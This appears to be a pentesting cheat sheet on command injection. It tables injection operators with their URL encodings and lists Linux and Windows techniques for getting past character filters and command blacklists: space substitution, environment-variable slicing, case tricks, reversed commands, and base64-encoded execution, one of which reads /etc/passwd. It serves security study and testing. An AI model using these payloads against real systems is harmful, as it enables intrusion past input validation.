# Command Injection

## Injection Operators

<table data-header-hidden><thead><tr><th width="164"></th><th width="170"></th><th width="138"></th><th width="245"></th></tr></thead><tbody><tr><td><strong>Injection Operator</strong></td><td><strong>Injection Character</strong></td><td><strong>URL-Encoded Character</strong></td><td><strong>Executed Command</strong></td></tr><tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr><tr><td>New Line</td><td></td><td><code>%0a</code></td><td>Both</td></tr><tr><td>Background</td><td><code>&#x26;</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td><code>|</code></td><td><code>%7c</code></td><td>Both (only second output is shown)</td></tr><tr><td>AND</td><td><code>&#x26;&#x26;</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td><code>||</code></td><td><code>%7c%7c</code></td><td>Second (only if first fails)</td></tr><tr><td>Sub-Shell</td><td><code>``</code></td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr></tbody></table>

***

## Linux

### Filtered Character Bypass

<table><thead><tr><th width="207">Code</th><th>Description</th></tr></thead><tbody><tr><td><code>printenv</code></td><td>Can be used to view all environment variables</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>${IFS}</code></td><td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td></tr><tr><td><code>{ls,-la}</code></td><td>Commas will be replaced with spaces</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>${PATH:0:1}</code></td><td>Will be replaced with <code>/</code></td></tr><tr><td><code>${LS_COLORS:10:1}</code></td><td>Will be replaced with <code>;</code></td></tr><tr><td><code>$(tr '!-}' '"-~'&#x3C;&#x3C;&#x3C;[)</code></td><td>Shift character by one (<code>[</code> -> <code>\</code>)</td></tr></tbody></table>

***

### Blacklisted Command Bypass

<table><thead><tr><th width="424">Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>'</code> or <code>"</code></td><td>Total must be even</td></tr><tr><td><code>$@</code> or <code>\</code></td><td>Linux only</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>$(tr "[A-Z]" "[a-z]"&#x3C;&#x3C;&#x3C;"WhOaMi")</code></td><td>Execute command regardless of cases</td></tr><tr><td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td><td>Another variation of the technique</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td><code>echo 'whoami' | rev</code></td><td>Reverse a string</td></tr><tr><td><code>$(rev&#x3C;&#x3C;&#x3C;'imaohw')</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></td><td>Encode a string with base64</td></tr><tr><td><code>bash&#x3C;&#x3C;&#x3C;$(base64 -d&#x3C;&#x3C;&#x3C;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td><td>Execute b64 encoded string</td></tr></tbody></table>

***

## Windows

### Filtered Character Bypass

<table><thead><tr><th width="246">Code</th><th width="487">Description</th></tr></thead><tbody><tr><td><code>Get-ChildItem Env:</code></td><td>Can be used to view all environment variables - (PowerShell)</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>%PROGRAMFILES:~10,-5%</code></td><td>Will be replaced with a space - (CMD)</td></tr><tr><td><code>$env:PROGRAMFILES[10]</code></td><td>Will be replaced with a space - (PowerShell)</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>%HOMEPATH:~0,-17%</code></td><td>Will be replaced with <code>\</code> - (CMD)</td></tr><tr><td><code>$env:HOMEPATH[0]</code></td><td>Will be replaced with <code>\</code> - (PowerShell)</td></tr></tbody></table>

***

### Blacklisted Command Bypass

| Code                                                                                                         | Description                              |
| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
| **Character Insertion**                                                                                      |                                          |
| `'` or `"`                                                                                                   | Total must be even                       |
| `^`                                                                                                          | Windows only (CMD)                       |
| **Case Manipulation**                                                                                        |                                          |
| `WhoAmi`                                                                                                     | Simply send the character with odd cases |
| **Reversed Commands**                                                                                        |                                          |
| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                         |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                 |
| **Encoded Commands**                                                                                         |                                          |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |
